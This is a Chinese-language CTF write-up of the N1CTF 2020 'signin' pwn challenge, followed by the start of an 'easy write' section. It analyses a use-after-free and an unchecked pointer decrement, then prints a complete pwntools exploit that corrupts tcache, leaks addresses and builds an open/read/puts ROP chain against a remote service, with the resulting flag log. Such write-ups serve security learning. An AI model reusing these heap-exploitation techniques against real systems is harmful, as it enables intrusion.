# NU1L 2020 WP





# PWN

## signin

经典的菜单体, 与ddctf的一个pwn非常类似, 打远程超级慢, 打一个小时左右....

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  while ( 1 )
  {
    show_menu();
    std::istream::operator>>(&std::cin, &v3);
    switch ( v3 )
    {
      case 2:
        del();
        break;
      case 3:
        show();
        break;
      case 1:
        add();
        break;
    }
  }
}
```



```c
unsigned __int64 add()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char n; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  std::operator<<<std::char_traits<char>>(&std::cout, "Index:");
  std::istream::operator>>(&std::cin, &v1);
  std::operator<<<std::char_traits<char>>(&std::cout, "Number:");
  std::istream::operator>>(&std::cin, &n);
  if ( v1 == 1 )
    sub_12E8((__int64)&p_1, (__int64)&n);
  if ( v1 == 2 )
    sub_12E8((__int64)&p_2, (__int64)&n);
  return __readfsqword(0x28u) ^ v3;
}
```

## vul

```c++
unsigned __int64 del()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  std::operator<<<std::char_traits<char>>(&std::cout, "Index:");
  std::istream::operator>>(&std::cin, &v1);
  if ( v1 == 1 )
    sub_1364((__int64)&p_1);
  if ( v1 == 2 )
    sub_1364((__int64)&p_2);
  return __readfsqword(0x28u) ^ v2;
}

void __fastcall sub_1364(__int64 a1)
{
  *(_QWORD *)(a1 + 8) -= 8LL;
  sub_17A6(a1, *(_QWORD *)(a1 + 8));
}
```

在进行删除的时候没有进行越界检查, 只是单纯的调整数据指针, 造成溢出漏洞。打印函数, 没有检查该数据是否在开辟内存范围内, 造成uaf漏洞, 可以打印数据指针指向的数据.



## 思路

这个题比较坑, 首先我是劫持了malloc_hook打one_gadget, 全部试了, 都无法打, 然后我劫持free_hook为system, 传入'/bin/sh'也没法get shell, 在程序里也没有发现沙箱, └> seccomp-tools也没检查出来, 不知道是采用啥来避免get shell, 只能采用orw来打了, 打入stack, 但是再泄漏stack的时候, 是需要打入envrion的 ,再free的时候需要对大小进行处理, 这里我也卡了好久, 修改chunk size为所开辟的大小就不会错误退出。后面就是劫持add 函数的ret地址来rop, 还有要控制好啥时候就开始rop, rop链太长, 出现中断, 这就没法打了, 开辟内存 > 0x80的时候就开辟内存至stack中, 然后触发rop





### 泄漏libc

```python
	li('exploit...')
	for i in range(258):
		li('ad: ' + str(i))
		ad(1, i)

	for i in range(258):
		li('rm: ' + str(i))
		rm(1)

	for i in range(int((0xef0 - 0x6e0) / 8) - 1):
		li('rm: ' + str(i))
		rm(1)

	dp(1)
	leak = int(ru('\n'))
	libc_base = 0
	li('leak: ' + hex(leak))

	libc_base = leak -  0x3ebc40 - 96
	#libc_base = leak -  0x3afc40 - 96

	li('libc_base: ' + hex(libc_base))
```



## 泄漏heap

```python
	t = 0x20 + 0x30 + 0x50 + 0x90 + 0x110 + 0x210 + 0x410
	for i in range(int(t / 8)):
		li('rm: ' + str(i))
		rm(1)

	#rm(1)
	dp(1)
	leak = int(ru('\n'))
	li('leak: ' + hex(leak))
	heap_base = leak - (0x55a7e41cee70 - 0x55a7e41bd000)
	li('heap_base: ' + hex(heap_base))
	t = 72721 + 593
```



## 修改tcache struct

修改该结构， 程序中存在第二个vector, 那么我们就可以采用第二个vector开辟内存时实现任意地址读写

```python
	for i in range(int(t / 8) - 4):
		li('rm: ' + str(i))
		rm(1)

	environ = libc_base + libc.sym['environ']
	
	li('environ: ' + hex(environ))
	ad(1, environ + 8)
```



## 泄漏stack

```python
	environ = libc_base + libc.sym['environ']
	
	li('environ: ' + hex(environ))
	ad(1, environ + 8)

	ad(2, 0)
	ad(2, 0)
	ad(2, 0)

	rm(2)
	rm(2)
	rm(2)
	dp(2)

	stack = int(ru('\n'))
	li('stack: ' + hex(stack))
	stack_ret = stack - (0x7ffc90831238 - 0x7ffc90831128)
	
	li('stack ret: ' + hex(stack_ret))
```



## 修复 chunk size

```python
	# passby free size check
	# recovery as normal
	rm(2)
	rm(2)
	ad(2, 0x31)
	ad(2, 0x31)
```



## 修改tcache struct

修改 0x91位置指向add 函数的return地址, 避免破坏原来的tcahce bin 地址, 也让flag字符串存在里面

```python
	# modify tcache struct 
	ad(1, 0)
	# 0x41
	p_a = heap_base + (0x556b504f0ee0 -  0x556b504df000)
	li('heap_0x41: ' + hex(p_a))
	ad(1, p_a)

	for i in range(3):
		ad(1, 0)
	
	p_a =  heap_base + (0x55f0423c1f30 -  0x55f0423b0000)
	li('heap_0x71: ' + hex(p_a))
	ad(1, p_a)

	for i in range(6):
		ad(1, 0)
	flag = './flag\x00'
	flag = flag.ljust(8, '\x00')
	flag_addr  = heap_base + 0xc0
	ad(1, u64(flag)) # heap_base  + 0xc0

	ad(1, stack_ret)
```



### 构造rop打入add函数return 地址

rop长度需要小于0x80, 然后使长度大于0x80的时候, 就会打入stack利用rop

```python
	libc_read = libc_base + libc.sym['read']
	libc_open = libc_base + libc.sym['open']
	libc_puts = libc_base + libc.sym['puts']

	pop_rdi = libc_base + 0x2155f
	pop_rsi = libc_base + 0x23e8a
	pop_rdx = libc_base + 0x1b96
	pop_rdx_rsi = libc_base + 0x130889

#	# ret to here
#	# open
	ad(2, pop_rdi)
	ad(2, flag_addr)
	ad(2, pop_rdx_rsi)
	ad(2, 0)
	ad(2, 0)
	ad(2, libc_open)

	# read
	ad(2, pop_rdi)
	ad(2, 3)
	ad(2, pop_rsi)
	ad(2, flag_addr + 0x100)
	ad(2, pop_rdx)
	ad(2, 0x100)
	ad(2, libc_read)

	# puts
	ad(2, pop_rdi)
	ad(2, flag_addr + 0x100)
	ad(2, libc_puts)
	#db()

	# trigger
	ad(2, 0)
```





## exp

```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# author: i0gan

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')


#context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'signin'
MODIFY_LD = 0
arch = '64'
libc_v = '2.27'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
libc_path = './libc.so'

# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)

# remote server ip and port
server_ip = "47.242.161.199"
server_port = 9990

# if local debug
LOCAL = 0
LIBC  = 1


#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)

def ad(i, n):
	sla('>>', '1')
	sla(':', str(i))
	sla(':', str(n))

def rm(i):
	sla('>>', '2')
	sla(':', str(i))

def dp(i):
	sla('>>', '3')
	sla(':', str(i))


#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	for i in range(258):
		li('ad: ' + str(i))
		ad(1, i)

	for i in range(258):
		li('rm: ' + str(i))
		rm(1)

	for i in range(int((0xef0 - 0x6e0) / 8) - 1):
		li('rm: ' + str(i))
		rm(1)

	dp(1)
	leak = int(ru('\n'))
	libc_base = 0
	li('leak: ' + hex(leak))

	libc_base = leak -  0x3ebc40 - 96
	#libc_base = leak -  0x3afc40 - 96

	li('libc_base: ' + hex(libc_base))

	t = 0x20 + 0x30 + 0x50 + 0x90 + 0x110 + 0x210 + 0x410
	for i in range(int(t / 8)):
		li('rm: ' + str(i))
		rm(1)

	#rm(1)
	dp(1)
	leak = int(ru('\n'))
	li('leak: ' + hex(leak))
	heap_base = leak - (0x55a7e41cee70 - 0x55a7e41bd000)
	li('heap_base: ' + hex(heap_base))
	t = 72721 + 593
	for i in range(int(t / 8) - 4):
		li('rm: ' + str(i))
		rm(1)

	environ = libc_base + libc.sym['environ']
	
	li('environ: ' + hex(environ))
	ad(1, environ + 8)

	ad(2, 0)
	ad(2, 0)
	ad(2, 0)

	rm(2)
	rm(2)
	rm(2)
	dp(2)

	stack = int(ru('\n'))
	li('stack: ' + hex(stack))
	stack_ret = stack - (0x7ffc90831238 - 0x7ffc90831128)
	
	li('stack ret: ' + hex(stack_ret))

	# passby free size check
	# recovery as normal
	rm(2)
	rm(2)
	ad(2, 0x31)
	ad(2, 0x31)


	# modify tcache struct 
	ad(1, 0)
	# 0x41
	p_a = heap_base + (0x556b504f0ee0 -  0x556b504df000)
	li('heap_0x41: ' + hex(p_a))
	ad(1, p_a)

	for i in range(3):
		ad(1, 0)
	
	p_a =  heap_base + (0x55f0423c1f30 -  0x55f0423b0000)
	li('heap_0x71: ' + hex(p_a))
	ad(1, p_a)

	for i in range(6):
		ad(1, 0)
	flag = './flag\x00'
	flag = flag.ljust(8, '\x00')
	flag_addr  = heap_base + 0xc0
	ad(1, u64(flag)) # heap_base  + 0xc0

	ad(1, stack_ret)

	libc_read = libc_base + libc.sym['read']
	libc_open = libc_base + libc.sym['open']
	libc_puts = libc_base + libc.sym['puts']

	pop_rdi = libc_base + 0x2155f
	pop_rsi = libc_base + 0x23e8a
	pop_rdx = libc_base + 0x1b96
	pop_rdx_rsi = libc_base + 0x130889

#	# ret to here
#	# open
	ad(2, pop_rdi)
	ad(2, flag_addr)
	ad(2, pop_rdx_rsi)
	ad(2, 0)
	ad(2, 0)
	ad(2, libc_open)

	# read
	ad(2, pop_rdi)
	ad(2, 3)
	ad(2, pop_rsi)
	ad(2, flag_addr + 0x100)
	ad(2, pop_rdx)
	ad(2, 0x100)
	ad(2, libc_read)

	# puts
	ad(2, pop_rdi)
	ad(2, flag_addr + 0x100)
	ad(2, libc_puts)
	#db()

	# trigger
	ad(2, 0)

'''
.text:0000000000001032                 leave
.text:0000000000001033                 retn
'''

def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
		else:
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path} )
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()

```



经过漫长的一小时攻打, 终于出了flag

```log
[*] rm: 9157                                                      │
[*] rm: 9158                                                      │
[*] rm: 9159                                                      │
[*] environ: 0x7fc86fe37098                                       │
[*] stack: 0x7ffefb537f88                                         │ 
[*] stack ret: 0x7ffefb537e78                                     │
[*] heap_0x41: 0x5613330b7ee0                                     │
[*] heap_0x71: 0x5613330b7f30                                     │
[*] Switching to interactive mode                                 │
n1ctf{77381c470c0d50e9ecd15a650e409176}                           │
                                                                  │
[*] Got EOF while reading in interactive
```





## easy write

使用cutter反编译

```c

undefined8 main(void)
{
    undefined8 uVar1;
    int64_t in_FS_OFFSET;
    int64_t var_20h;
    int64_t var_18h;
    int64_t var_10h;
    int64_t var_8h;
    
    var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);
    func_0x000010b0(_reloc.stdout, 0);
    func_0x000010b0(_reloc.stdin, 0);
    func_0x000010b0(_reloc.stderr, 0);
    alarm(0x3c);
    sleep(2);
    printf("Here is your gift:%p\n", _reloc.setbuf);
    var_18h = malloc(0x300);
    write(1, "Input your message:", 0x13);
    read(0, var_18h, 0x2ff);
    write(1, "Where to write?:", 0x10);
    read(0, &var_20h, 8);
    *(int64_t *)var_20h = var_18h;
    var_10h = malloc(0x30);
    write(1, "Any last message?:", 0x12);
    read(0, var_10h, 0x2f);
    .plt.sec(var_10h);
    uVar1 = 0;
    if (var_8h != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar1 = __stack_chk_fail();
    }
    return uVar1;
}
```

 